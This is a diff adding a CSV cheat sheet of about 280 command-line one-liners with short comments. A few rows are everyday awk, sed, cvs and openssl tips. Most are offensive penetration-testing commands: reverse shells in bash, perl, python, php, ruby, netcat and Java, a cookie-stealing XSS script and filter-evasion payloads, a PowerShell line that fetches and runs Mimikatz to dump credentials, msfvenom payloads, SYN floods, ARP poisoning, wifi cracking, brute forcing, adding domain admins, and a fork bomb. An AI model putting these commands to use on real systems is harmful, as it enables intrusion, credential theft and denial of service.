@@ -1,0 +1,921 @@
+CommandID,Command,Comment,Program
+2,"awk /^[TERM]/ '{print ""See the"",$1,""at the"",$3}' words.txt",Use only the lines that match a given RegEX [TERM],Awk
+3,"awk '{print ""Avg for"",$1,""is"",($2+$3+$4)/3}' grades.txt","Calculations using AWK. AWK is a huge language, not just for printing columns",Awk
+4,awk 'NR==1;END{print}' file.txt,Print first and last lines of a file,Awk
+5,"awk -F "";"" '{print $2}' file.txt",Split the file on ; instead of space,Awk
+6,"awk '/start_pattern/,/stop_pattern/' file.txt",Print a portion of the text,Awk
+7,show system mode,show mode of as500,
+8,interface GigabitEthernet7; switchport trunk allowed vlan add 2,add vlan to your interface,
+9,cvs diff <file>,diff file in cvs,Cvs
+10,cvs log <file>,show history of files,Cvs
+11,"file=cvs.txt; cvs update -r $(cvs log $file | grep ^revision | sed -n 2p | awk '{print $NF}') $file && mv $file{,.old} && cvs update -A $file && mv $file.old $file && cvs commit -m ""Reverted to previous version"" $file",roll back cvs change,Cvs
+12,find -L . -type l,find broken symlinks,Shell
+13,chkconfig --list,List services started on boot,
+14,screen -D -R [ID],Hijack screen,
+15,ssh -R [lport]:[rip]:[rport] [ip] -N,Forward the remote port to the local machine,SSH
+16,ssh -L [lport]:[rip]:[rport] [ip] -N,Forward the local port to the remote machine,SSH
+17,dd if=/dev/zero of=1g.img count=1M bs=1K,1Gig of zeros,Bash
+18,chage -l root,get password policy for root,Shell
+19,while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &,Display system clock in terminal top right corner! :-),Bash
+20,"smartctl -d megaraid,0 -x /dev/sda",display disk info,Shell
+21,hping3 -1 [ip],icmp ping,Hping
+22,hping3 -8 [port]-[port] -S [ip] -V,syn scan port range with hping,Hping
+23,hping3 -A [ip] -p [port],ACK scan on port,Hping
+24,hping3 -2 [ip] -p [port],udp port scan,Hping
+25,hping3 -Q [ip] -p [port] -s,Get initial sequence number,Hping
+26,hping3 -S [ip] -p [port] --tcp-timestamp,get remote timestamp,Hping
+27,hping3 -F -p -U [ip] -p [port],Xmas' scan,Hping
+28,hping3 -1 [ip].x --rand-dest -I em1,Sweep range for up hosts ie 192.168.1.x,Hping
+29,hping3 -9 HTTP -I em1,Intercept all http,Hping
+30,hping3 -S [victim] -a [gw] -p [port] --flood,Syn flood victim,Hping
+31,display interface brief,hp switch show if info,
+32,GET //google.com,get google,
+33,hydra -L [usernames] -P [passwords] -t 1 -e ns -f -vV <destination> http-get /,Brute HTTP with hydra -s 443 for ssl,Hydra
+34,if [ $<variable> -gt <value>]; then <command>; else <command>; fi,bash if (greater than) statment syntax examole,Bash
+35,"<script>i = new XMLHttpRequest(); i.open('GET', '[dest]' + document.cookie, true); i.send();</script>",Grab the cookie,HTML
+36,meterpreter> execute -f cmd.exe -i -H,executes a command on the remote machine (i.e. opens up a command shell),Meterpreter
+37,nmap -sS -P0 -T4 -n -iL info/ips.txt -oA nmap/quick-scan,Quick scan to set us off,Nmap
+38,nmap -sS -P0 -T4 -Pn -n -iL info/ips.txt -oA nmap/quick-scan,Quick scan of all the hosts (ignore pinging),Nmap
+39,nmap -sS -P0 -T4 -p0-65535 -n -g 80 -iL info/ips.txt -oA nmap/source-port,Source port spoofing,Nmap
+40,nmap -sS -sU -T4 -Pn -p0-65535 -n -iL info/ips.txt -oA nmap/all-ports,All port scan : assume up,Nmap
+41,nmap -sS -P0 -T4 -n -A -iL info/ips.txt -oA nmap/os-discovery,OS Detection,Nmap
+42,nmap -sS -P0 -T5 -n -p 1433 -iL info/ips.txt -oA nmap/internal-sqls,Find sql servers,Nmap
+43,openssl x509 -noout -modulus -in [CERT] | openssl md5,# Verify the certificate / private key association,OpenSSL
+44,openssl x509 -in certificate.crt -text,https://www.sslshopper.com/article-most-common-openssl-commands.html,OpenSSL
+45,"echo """" | openssl s_client -connect [ip]:443 2>/dev/null| grep ^subject | sed 's/^.*CN=//'",Grab the hostname in the certificate,OpenSSL
+46,ifconfig eth0 hw ether 00:E0:81:5C:B4:0F,Change MAC address,Shell
+47,ip route show to match [IP],How will the sytem route traffic to [IP],Shell
+49,skipfish -O -MEU -o results-nonauth -W ~/pentest/wordlists/skipfish.wl -k 00:30:00 https://[ip],Skipfish scanner,Skipfish
+50,curl -D - --proxy1.0 [ip]:80 -m 2 [url],Curl through a proxy (-m = timeout),Shell
+51,"curl -k --cookie ""[cookie]"" [url] --silent | grep ""<title>""",Curl with cookie,Shell
+52,"smbclient -I [IP] -L [domain] -N -U """"",Null session smb,SMBClient
+53,snmpwalk -v 1 -c public [TARGET],Default community string in SNMP,
+54,ettercap -M arp -T -i em1 -L log /[TARGET]//,Ettercap arp poisoning,
+55,fierce -threads 10 -dns [domain] -wordlist [wordlist] -dnsserver 8.8.8.8 -file fierce.txt,Fierce (v0.9) - DNS bruteforcer,
+56,lsof 2>/dev/null | grep deleted;  cat /proc/24702/fd/4,recover file after being deleted,
+57,rpm -qa | less,list installed programs,
+58,"echo ""hello fredrick"" | sed 's/.\{4\}$//'",remove 4 chars,
+59,cat db.schema | sed G,add space after each line,
+60,sed 's/ *$//;s/$/;/' linkedin.txt | paste - - - - | tr -d '\t',convert a list into a multi line CSV,Sed
+61,sed -i '/^[0-9]/ s/^/sshd: /' /etc/hosts.allow,# Add to the beginning of the line starting with a pattern,Sed
+62,bash -i >& /dev/tcp/10.0.0.1/8080 0>&1,bash reverse shell,Shell
+63,"perl -e 'use Socket;$i=""10.0.0.1"";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",perl reverse shell,Perl
+64,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'",python reverse shell,Python
+65,"php -r '$sock=fsockopen(""10.0.0.1"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");'",php reverse shell : php from the CLI,Php
+66,"ruby -rsocket -e'f=TCPSocket.open(""10.0.0.1"",1234).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",ruby reverse shell,Ruby
+67,nc -e /bin/sh 10.0.0.1 1234,net cat reverse shell,Netcat
+68,null union all select load_file('/etc/passwd')/*,Load a file with MYSQL,
+69,"exec sp_configure 'xp_cmdshell', 1 go reconfigure",enable xp_cmdshell,
+70,create user victor identified by pass123 temporary tablespace temp default tablespace users;grant connect to victor;grant resource to victor;,oracle add user,---
+71,"insert into mysql.user (user, host, password) values ('victor', 'localhost', password('pass123'))",mysql add user,
+72,"exec sp_addlogin 'victor', 'pass123';  exec sp_addsrvrolemember 'victor', 'sysadmin'",mssql add user,
+73,# rm -rf `which nano`; ln -s `which vim` /usr/bin/nano,Fix nano <3 ;),
+74,net start,list windows services,
+75,net accounts,list windows password requirements : add /domain for AD,
+76,net accounts /domain,password requirements domain,
+77,reaver -i mon0 -c <channel> -b <bssid> -vv,try to reave WPS wifi,
+78,"<%div style=""xss:expression(alert(123))"">",.net xss filter evasion,
+79,<IMG SRC=j&#X41vascript:alert('test2')>,.net xss filter evasion,
+80,%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi,UTF7 xss,
+81,sl,not ls,
+82,"command=""[cmd]"";echo -n xdotool key "" ""; echo -n $command| sed  's# #€#g' | sed -e 's/\(.\)/\1 /g' | sed 's#/#slash#g' | sed 's#@#at#g'|  sed 's#€#space#g' | sed 's#-#minus#g'|sed 's#>#greater#g'| sed 's#+#plus#g' | sed 's#""#quotedbl#g' | sed 's#~#asciitilde#g' | sed 's#\.#period#g' | sed 's#_#underscore#g'; echo KP_Enter",Abuse open x11 : Think open term add user add key,
+83,echo 1 > /sys/module/usbcore/parameters/old_scheme_first,WIFI enable USB2 before USB3 : helps with passthrough,
+84,airodump-ng -f 4000  --cswitch 1 --band abg  wlan0mon --output-format csv -w WifiOverview,WIFI : Scan the range in an orderly manner,
+85,ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifconfig wlan0 up;,WIFI : Enable monitor mode on interface,
+86,yaps.exe -start -start_address [victim] -stop_address [victim] -start_port [port] -stop_port [port] -timeout 5 -resolve n,"Yaps windows portscan, upload first duh",
+87,"cat json.txt | sed ""s/false/§false§/g"" | sed ""s/true/§true§/g"" | sed ""s/null/§null§/g"" | sed ""s/:\""/:\""§/g"" | sed ""s/\"",/§\"",/g"" | sed ""s/\""}/§\""}/g"" | sed ""s/\\[\\]/\\[§§\\]/g""",Burpify JSON request,Burpsuit
+88,<script src=//[ip]>,mini xss,
+89,msfvenom -p windows/meterpreter/reverse_https -f dll -e x86/shikata_ga_nai -i 30 LHOST=[IP] LPORT=443 > /data/Clients/[FILE],MSF Venom make dll,MSFVenom
+90,runas /user:[DOM]\[USER] [EXE],Windows run as,Powershell
+91,"accesschk.exe -uwcqv ""Authenticated Users"" *","Priv esc check weak service perms, you may need an older version for older windows!",Accesschk
+92,Set-ExecutionPolicy unrestricted,powershell bypass block,Powershell
+93,powershell.exe -noprofile -executionpolicy bypass,powershell bypass block,Powershell
+94,"for host in $(cat ../nmap/[IP File]); do echo ""Trying $host""; smbclient -L $host -U  [DOM]/[USER]%'[PASS]'; done",loop to find user shares,Bash
+95,"powershell ""IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1qMn59d'); Invoke-Mimikatz -DumpCreds""","Invoke mimicatz, can use with psexec for pwnage",Powershell
+96,procdump.exe -accepteula -ma keepass.exe keepass.dmp,Dump a processes memory for offline abuse,ProcDump
+97,setenforce permissive,"kill puppies, you monster (disable SElinux, though seriously just work around it)",
+98,"for host in $(cat userhosts.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host 'WMIC ComputerSystem Get UserName'; done | tee loggedin-dirty.txt;cat loggedin-dirty.txt | grep -v ""^\["" | grep -v ""^Impacket"" | grep -v ""^Trying"" | grep -v ""SMB SessionError"" | sed '/^$/d'",loop for who is where,Psexec
+99,"Get-ADUser -filter * -properties * | sort-object passwordlastset | select-object samaccountname, passwordlastset, passwordneverexpires, homedirectory, mail, enabled | Export-csv -path c:\temp\pwprofile.csv","Powershell password last changed, run on DC",Powershell
+100,dnscmd 127.0.0.1 /ZoneExport [FQDN] [OUT].zone,dump dns zone on DC,
+101,"mount -t cifs \\\\[victim]\\SYSVOL -o username=[user],password=[password] mount/; nautilus mount/;",Mount Sysvol share (hosted on the DC),
+102,"egrep -r ""cpassword|net"" mount",Look in 'mount' for share (mount sysvol first),
+103,"for host in $(cat ../nmap/IPs-SMB.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host ""ipconfig""; done | grep ""IPv4 Address\|Ethernet adapter\|^[0-9]"" | sed '/^$/d' | tee dualhomed-search.txt",loop to look for dual homed hosts,Psexec
+104,for i in `cat smb_up `; do timeout 10 psexec.py [user]:[pass]@$i net localgroup administrators; done | tee local_admin_information,loop to find local admins,Psexec
+105,"egrep -v ""(\*\] T|\[\*\] F|[\*\] C|[\*\] U|[\*\] S|[\*\] R)"" local_admin_information | egrep -v ""(\[\*\] P|\[\*\] R|\[\*\] S|\[\*\] O|\[\*\] U)"" | grep -v ""Alias name"" | grep -v ""Administrators have complete"" | grep -v \[\!\] | grep -v \[-\] | dos2unix | grep -v ""^$"" | sed s/""\[\*\] Creating service.*on""/''/g | grep -v Members | sed s/\\.\\.\\.\\.\\./','/g | sed s/""^ ""/""€""/g | sed s/'The command completed successfully.'/€/g | tr ""\n"" "","" | tr € ""\n"" | grep -v ""^$"" | sort | uniq  > local_admins.csv",turn loop for local admins into csv,
+106,"tsql -S [IP] -U sa -P""[PASS]""",connect to mssql,
+107,impacket-mssqlclient [user]:[pass]@[ip] -port [port],connect to mssql,Mssqlclient
+108,"c:\windows\system32\inetsrv\appcmd.exe list apppool ""SharePoint Central Administration v4"" /text:ProcessModel.Password",Recover IIS password,Cmd
+109,netdom query trust,get domain trusts,
+110,netsh interface portproxy show all,show native port forwards windows,Netsh
+111,netsh interface portproxy add v4tov4 protocol=tcp listenport=[lport] connectport=[rport] listenaddress=[lip] connectaddress=[rip],set native port forward windows,Netsh
+112,netsh interface portproxy reset,reset native port forward windows,Netsh
+113,"sc query ""MpsSvc""",windows firewall status,
+114,netsh advfirewall firewall,windows firewall status,Netsh
+115,tasklist /v,Windows process list,
+116,taskkill /f /im [PROCESS],Windows force kill process,
+117,"netstat -a | find ""LISTENING""",Windows list listening ports,
+118,"tasklist /FI ""IMAGENAME eq [process].exe"" /V",Windows open files,
+119,bypassuac.exe /c [COMMAND],ByPassUAC,
+120,at [TIME] command.exe /s cmd SYSCMD,Scheduled cmd to run,
+121,"for host in $(cat hosts.txt); do psexec.py [DOM]/[USER]:'[PASS]'@$host ""cmd.exe""; done","loop around and open cmd, Psexecy.py != psexec msf != sysinternals psexec",
+122,"psexec.py -hashes [LM]:[NTLM] [DOM]/[USER]@[TARGET] ""cmd.exe""",PSExec with hashses,Psexec
+123,"rpcclient -U '[DOMAIN]\[USER]'%'[PASS]' '[TARGET]' -c enumdomusers,enumdomgroups",RPCClient smb show users and groups,
+124,name=sslfile;openssl genrsa -out $name.key 2048;openssl req -new -key $name.key -out $name.csr; openssl x509 -req -days 10 -in $name.csr -signkey $name.key -out $name.crt;openssl pkcs12 -export -clcerts -in $name.crt -inkey $name.key -out $name.p12;openssl pkcs12 -in $name.p12 -out $name.pem -clcerts,Create Self-signed cert / key,
+125,"wmic service get name,displayname,pathname,startmode",Unquoted Service Paths,
+126,sc query,Unquoted Service Paths,
+127,"sc qc ""[SERVICE]""",Unquoted Service Paths,
+128,"sc config ""[SERVICE]"" start= auto","Unquoted Service Paths, start service",
+129,"sc config ""[SERVICE]"" start= disabled",Unquoted Service Paths,
+130,"Sub Test();Shell (""powershell"");End Sub",VBA launching command,
+131,"echo var WinHttpReq = new ActiveXObject(""WinHttp.WinHttpRequest.5.1"");WinHttpReq.Open(""GET"",WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject(""ADODB.Stream"");BinStream.Type=1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile(""out.exe"");>wget.js",Javascript wget windows oneline : cscript /nologo wget.js http://[IP],
+132,netsh wlan show profile,Windows Wireless,
+133,"netsh wlan show profile name=""[SSID]"" key=clear",Windows Wireless,
+134,"for host in $(cat localsubnet.txt); do echo ""Trying $host""; winexe --user [Domain]/[user]%[pass] //$host ""netsh wlan export profile name=[PROFILE] key=clear""; done",loop dump wifi keys,
+135,run autoroute -s [CIDR SUBNET],proxy Metasploit pivot,MSFConsole
+136,run autoroute -p,proxy metasploit pivot,MSFConsole
+137,background it then run...,proxy Metasploit pivot,MSFConsole
+138,use auxiliary/server/socks4a,proxy Metasploit pivot,MSFConsole
+139,proxychains cmd,proxy pivot,Proxychains
+140,type [FILE],Cat for windows,Cmd
+141,"net group ""Domain Admins"" /domain",Domain Admins windows,Cmd
+142,theHarvester.py -h -d [domain] -l 1000 -b all | tee harvester-search-[DETAIL].txt,harvester,TheHarvester
+143,/data/hacking/theHarvester/theHarvester.py -d [domain] -l 1000 -b linkedin | tee harvester-people-[DETAIL].txt,harvester linkedin,TheHarvester
+144,wine KeeCracker.exe -w /data/hacking/dictionaries/rockyou.dic -t 4 Database.kdbx,KeePass2 Cracking,
+145,find / -iname '[SEARCH TERM]' 2>/dev/null,Find files,Shell
+146,/opt/nessus/bin/nessuscmd -U -O -p[port] -V -i [plugin ID] [target IP],Single Nessus Module,Nessus
+147,openssl s_client -connect [domain]:443,'Telnet' s_client to SSL,
+148,ike-scan -A -v -id=test -f [input file] -P[PSK output file],IKE Agressive,IKE-Scan
+149,psk-crack -d [word list e.g. rockyou.txt] [input key file],IKE Agressive,PSK-Crack
+150,ipconfig /displaydns,Windows ARP Cache,Shell
+151,use multi/handler,MSFConsoles for catching reverse shells,MSFConsole
+152,set PAYLOAD <OS>/meterpreter/reverse_https,MSFConsole hints,MSFConsole
+153,options,List options of payload,MSFConsole
+154,set <variable> <value>,Set variable in MSFConsole,MSFConsole
+155,set ExitOnSession false,MSFConsole hints,MSFConsole
+156,exploit -j,Start exploit in jobs,MSFConsole
+157,net user [user] [pass] /add /domain,Add a domain user from the CLI,Cmd
+158,"net group ""Domain Admins"" [user] /add /domain",Add [User] to the domain admins group,Cmd
+159,"net group ""Enterprise Admins"" [user] /add /domain",Add user to enterprise admins,Cmd
+160,"net localgroup ""Remote Desktop Users"" [user] /add /domain",Add user to the RDP group,Cmd
+161,"net localgroup ""Administrators"" [user] /add /domain","Add a user to the local admin group, not as useful any more",Cmd
+162,sqlmap --exclude-sysdbs --eta --is-dba  --current-user --current-db --hostname -o -r sql1.txt,SQLmap generic command,SQLMap
+163,etterfilter *.filter -o smb.ef,ARP Spoofing filter,
+164,ettercap -i em1 -L etter.log -T -M arp:remote /192.168.104.254/// ////,ARP Spoofing gateway,
+165,ettercap -i wlan0 -L etter.log -T -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//,ARP Spoofing everything,
+166,ettercap -i [interface] -L etter.log -T -P dns_spoof -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//,ARP Spoofing DNS,
+167,ipcalc -b [CIDR Subnet],Subnet calculator,
+168,tcpdump -n -i [interface],TCPDump (no DNS resolution),
+169,arping -I em1 [TARGET IP],ARPing,
+170,for a in {0..254}; do arping -D -c 1 -I eth0 [NETWORK].$a; done | tee arping-[NET].txt,ARPing sweep network,
+171,ifconfig eth0 192.168.0.x/24,Temporary IP,Cmd
+172,airmon-ng start wlan1,Wireless survey WIFI,
+173,ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifup wlan0,"Wireless survey WIFI, useful if airmon start is broke",
+174,airodump-ng -c [Channel #] --bssid [MAC Address] --showack -w [SSID] wlan1mon,WIFI WPA handshake capture,
+175,wpaclean [OUTPUT] [INPUT],WIFI WPA handshake prep,
+176,aircrack-ng [INPUT.cap] -J [OUTPUT],WIFI WPA handshake prep,
+177,airodump-ng -c 11 --bssid [VICTIM MAC] -w [OUTPUT] mon0,wep crack : 1) start capturing IV's,
+178,aireplay-ng -0 0 --ignore-negative-one -e [SSID] -a [AP MAC] -c [VICTIM MAC] mon0,wep crack 2) De auth clients,
+179,aireplay-ng -1 0 -e [VICTIM SSID] -a [VICTIM MAC] -h [OurMac] wlan0,wep crack 3) Create a fake auth to the AP,
+180,aireplay-ng -3 -b [VICTIM MAC] -h [OurMac] wlan0,wep cracking,
+181,aircrack-ng -b [VICTIM MAC] [OUTPUT]*cap,wep cracking,
+182,iptables -I OUTPUT -d [DST IP] -j DROP,Block outbound rule,
+183,iptables -I INPUT -p tcp --destination-port [PORT] -j ACCEPT,Accept inbound port rule,
+184,medusa -M ssh -U userlist -P passwordlist -h [host],medusa brute force,Medusa
+185,./mp64.bin -o custom.dic -1 tT -2 eE3 -3 ?s ?1qq?2qqq?2?2qq?2?3?3,Word list generator,
+186,/data/hacking/hashcat-0.49/hashcat-cli64.bin -m 99999 wordseed.dic -r /data/hacking/hashcat-0.49/rules/leetspeak.rule --stdout | sort -u > custom.dic,Word list generator,
+187,ncrack -v -d1 -T5 -P /usr/share/wordlists/rockyou.txt [service eg vnc]://[target IP]:[port eg 5900] -oA [output file]-ncrack.txt,brute force ncrack vnc,
+188,dig -t AXFR [FQDN] @[SERVER IP],DNS zone transfer,
+189,nbtscan -v -s : 192.168.0.0/24 >> nbtscan-[SUBNET].txt,NBTScan,
+190,for a in {0..254}; do nbtscan -v -s : 192.168.$a.0/24 >> nbtscan-192.168.$a.txt; done,NBTScan en masse,
+191,"for a in {0..255}; do host -t ns $a.168.192.in-addr.arpa | grep -v ""name server""; done >> networks.txt",network discovery RDNS,
+192,"cat networks-dirty.txt | grep ""^[0-9]"" | awk {'print $1'} | awk -F ""."" {'print $3"".""$2"".""$1"".0/24""'} | sort -u > nets.txt",network discovery RDNS,Shell
+193,nmap -sS -n -v -T5 -iL networks-sorted.txt -oA nmapScan-ARP,network discovery RDNS,Nmap
+194,"cat nmapScan-ARP.gnmap | grep ""Status: Up"" | awk {'print $2'} | awk -F ""."" {'print $1"".""$2"".""$3"".0/24""'} | sort -u > networks-withlivehosts.txt",network discovery RDNS,Shell
+195,python -m SimpleHTTPServer [PORT],instant web server,
+196,smbrelayx.py -h [TARGETIP] -e [PAYLOAD exe],smbrelay targeted,
+197,smbrelayx.py -e [PAYLOAD exe],smbrelay reflection : note read into http -> smb refelction,
+198,/data/hacking/Responder/Responder.py -I eth0 -wrfFd --lm -i [YOUR IP],responder NBNS LLMNR,
+199,smbclient -L [TARGET] -U [DOM]/[USER]%'[PASS]',"List smb shares on a target host domain and pass are optional, % seperates user from pass",SMBClient
+200,"strings [FILENAME] --bytes=2 |grep ""^sa$"" -A 4",text in binaries,
+201,telnet [IP] 25,Telnet Mail,
+202,HELO [FQDN of your RDNS],Telnet Mail,
+203,MAIL FROM: [SENDER ADDRESS],Telnet Mail,
+204,RCPT TO: [RECIPIENT ADDRESS],Telnet Mail,
+205,DATA,Telnet Mail,
+206,Subject: [SUBJECT],Telnet Mail,
+207,Date: [DATE],Telnet Mail,
+208,From: [REAL NAME] <[EMAIL]>,Telnet Mail,
+209,To: [REAL NAME] <[EMAIL]>,Telnet Mail,
+210,[MESSAGE],Telnet Mail,
+211,. (don't forget the full stop),Telnet Mail,
+212,halberd -v -p 10 [URL],load balance detection,
+213,enum4linux.pl -a -u [USER] -p [PASS] [TARGET] | tee [CLIENTNAME].domainenum,Get a listing of all users and groups for targeting your post exploitation,
+214,"cat [CLIENTNAME].domainenum | grep ""^user"" | cut -d "":"" -f 2 | cut -d ""]"" -f 1 | cut -d ""["" -f 2 > userlist.txt",Get a list of all the users in the domain from a full dump,
+215,frogger.sh,Check for vlans that you can hop to : may need to change the grep for interfaces,
+216,vconfig add em1 [VLANID],manual vlans,
+217,dhclient -d -v -4 -pf /tmp/dhclient.pid -lf /tmp/dhclient.lease em1,dhcp client,Shell
+218,cat `find /var/lib/NetworkManager/*ens10* -type f -mmin -360 -ls | awk {'print $11'}`,dhcp lease rpm,Shell
+219,cat `find /var/lib/dhcp/dhclient*eth0* -type f -mmin -360 -ls | awk {'print $11'}`,dhcp lease deb,Shell
+220,ls -lt /var/lib/NetworkManager/,dhcp lease,Shell
+221,route add -net [CIDR] gw [IP] [INTERFACE],route table add,
+222,route del -net 0.0.0.0 gw [GW] eth1,route table del,
+223,7z a -p -mem=AES report.zip [INPUT FILE],Encrypted zip,
+224,./hashcat-cli64.bin --session=[SESSIONNAME] -m[hash ID] [input file] [dict file] --rules rules/[rule file e.g. best64.rule d3ad0ne.rule etc],hashcat cpu,Hashcat
+225,hc --gpu-temp-abort=100 --remove -m5500 netntlmv1.hash -a3 -1 '?u?l?d' '?1?1?1?1?1?1?1?1' -o hash.crack,hashcat assuming that hc is an alias (kraken | pablo),
+226,500  MD5 Crypt $1 | 7400 SHA256 Crypt $5 | 1800 Sha512 Crypt $6,hashcat types,Hashcat
+227,1000 NTLM | 3000 LM,hashcat types,Hashcat
+228,1100 MScashv1 | 2100 MScashv2 (802.1X),hashcat types,Hashcat
+229,2500 WPA/WPA2,hashcat types,Hashcat
+230,5600 NetNTLMv2 | 5500 NetNTLMv1 | 5400 = IKE-PSK SHA1 | 5300 = IKE-PSK MD5 |,hashcat types,Hashcat
+231,cvs checkout [package name],cvs check out repo,Cvs
+232,cvs update -d .,cvs update local repo,Cvs
+233,"cvs commit -m ""[Comment]"" [File inc ""package""]",cvs comit change with message,Cvs
+234,"cvs add [File inc ""package""]",cvs add a new file,Cvs
+235,cvs release [package or file in package],cvs delete file,Cvs
+236,for a in $(cat ../nmap/IPs-HTTPS.txt); do sslscan $a; done | tee sslscan-[NET].txt,"sslscan, you will want to git clone and make static if your in kali",SSLScan
+237,openssl s_client -connect victim.com:443 (this shows the chain),sslscan cert checks,
+238,"openssl s_client -showcerts -connect victim.com:443 2>/dev/null | awk '$0==""-----BEGIN CERTIFICATE-----"" {p=1}; p; $0==""-----END CERTIFICATE-----"" {p=0}' (this pulls just the certificates for each in the chain)",sslscan cert checks,
+239,"openssl x509 -noout -text | grep -i ""signature algorithm\|before\|after\|issuer\|subject:"" (split the above commands output and stick in here, then manually analyse)",sslscan cert checks,
+240,genpasswd [CHAR LENGTH],Password Generator,
+241,iodine -P [pass] [server],dns tunneling,
+242,nmap -sS -Pn --open -T5 -p- [portspoofip] | tee nmap-tcp-outbound.txt,nmap outbound tcp,Nmap
+243,nmap -Pn --open -T5 -sU -p- [portspoofip]| tee nmap-udp-outbound.txt,nmap outbound upd,Nmap
+244,nmap --script smb-security-mode.nse -p445 -iL [hostsfile] -oA nmap-SMBSigning,nmap smb signing,Nmap
+245,nmap -sS -n -v -T4 -P0 -p- -oA nmap-tcp-scan -iL subnets.txt,nmap devicemap all tcp,Nmap
+246,nmap -sU -n -v -T4 -P0 --top-ports 1000 -oA nmap-udp-scan -iL subnets.txt,nmap devicemap top 1000 udp,Nmap
+247,"grep ""Discovered open port"" nmap-udp-scan.txt | sed ""s/\// /g"" | sed ""s/ /\t/g"" | awk -F ""\t"" {'print $7""\t""$5""\t""$4""\topen""'} > devicemap-udp.tsv",nmap devicemap,Nmap
+248,"for file in $( ls -lash | grep "".gnmap"" | awk {'print $10'} ); do cat $file | grep ""Ports"" | grep ""open"" | awk {'print $2'} | sort -u > IPs-`echo $file | cut -d ""-"" -f 2 | cut -d ""."" -f 1;`.txt; done",nmap service discovery,Nmap
+249,"cat nmapScan-[SERVICE].gnmap | grep ""Ports"" | grep ""open"" | grep -v ""open|filtered"" | awk {'print $2'} | sort -u > IPs-[SERVICE].txt",nmap service discovery,Nmap
+250,"cat users | awk '{print substr ($0, 1, 1),$2}' | tr [A-Z] [a-z] | sort | uniq","Convert a user list in format ""first last"" to flast",Shell
+251,exec 5<>/dev/tcp/[me]/[port]; while read line 0<&5; do $line 2>&5 >&5; done,bash reverse shell using a file handle '5',Bash
+252,rm -f /tmp/p; mknod /tmp/p p && nc [me] [port] 0/tmp/p,telnet reverse shell,
+253,telnet [me] [port]| /bin/bash | telnet [me] [lport],telnet reverse shell,
+254,"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,""[me]:80"");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",perl windows reverse shell,
+255,"r = Runtime.getRuntime(); p = r.exec([""/bin/bash"",""-c"",""exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done""] as String[]); p.waitFor()",Java reverse shell - replace ; with newline,
+256,"nmap -iL hosts -sC --script http-screenshot -p 80,443,8080,8081,8443,8843,8000,9000,9090,9081,9091,8194,9103,9102,8192,6992,16993,16994,16995,623,664 -v -n",Take a screenshot of a HTTP service,Nmap
+257,modprobe nbd  max_part=16;  qemu-nbd -c /dev/nbd0 [File]; fdisk -l /dev/nbd0,moount VDI disk image,
+258,losetup /dev/loop0 [file]; kpartx -a /dev/loop0; vgscan; vgchange -ay changethishostname-vg; mount /dev/changethishostname-vg/root mnt/,Mount LVM filesytem / image,
+259,"printf ""%s"" $i | ecryptfs-unwrap-passphrase .ecryptfs/victim/.ecryptfs/wrapped-passphrase -; ecryptfs-add-passphrase -fnek; mount -t ecryptfs .ecryptfs/victim/.Private/ test/",Ecrypt FS mounting,
+260,"cat DC_dump.txt | awk -F : '{print $1"":""$4}' | sort -k 2 -t : > sorted_hash; cat ntlm_cracked | sort -k 1 > sorted_cracked; join -t : -1 2 sorted_hash -2 1 sorted_cracked  >> pass_info",create medusa or hydra password list from cracked hashes,
+261,netstat -tulpen,list network connections,
+262,ip xfrm state list,print vpn keys,
+263,echo 1 > /proc/sys/net/ipv4/ip_forward,enable ip forwarding in the kernel temporarily,
+264,:(){:|:&;:,Fork Bomb : CRASH SYSTEM,
+265,"iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j LOG; iptables -t nat -A PREROUTING -p tcp -d [ip] --dport [port] -j DNAT --to-destination [rhost]:[rport]; iptables -A FORWARD -p tcp -d [ip] --dport [port] -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT",Iptables port forward,
+266,logins -p,list users without password,
+267,svsc -a,list services,
+268,prstat -a,list processes,
+269,ver,system information,
+270,"xterm -bg black -title ""TryH4rD3r"" -e ""ls -la;read""",Spawn a cmd in a gui window,
+271,rdpy-rdpscreenshot.py 1.1.1.1,Take a screenshot of a RDP server (provided by rdpy),
+272,xwd -display [victim] :0 -root -out /tmp/[victim].xpm;xwd -display ip :0 -root -out /tmp/[victim].xpm; convert /tmp/[victim]; xpm -resize 1280x1024 /tmp/[victim].jpg,take a screenshot from a open X11 and convert it to a jpg,
+273,tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply',capture ping replies,
+274,systeminfo /S [victim] /U [domain]/[user] /P [pass],remote system info,
+275,fsutil fsinfo drives,list drives,
+276,reg query HKLM /f [text]  /t REG SZ /s,search for text in the reg,
+277,findstr /si [text] '.txt|xml|xls',grep for text in files,Cmd
+278,net view /domain,show hosts in the current domain or add a domain for searching,Cmd
+279,net share,current smb shares,Cmd
+280,net session,active sessions,Cmd
+281,"net share [sharename] [folder] /GRANT:Everyone,FULL","Share a directory with the world, probably don't want the world",Cmd
+282,sc \\[victim] create [name] binpath=[pathtoexe] start= auto,Create a service on remote machine,
+283,xcopy /s \\[victim] \dir [directory],copy a remote file to lcwd,
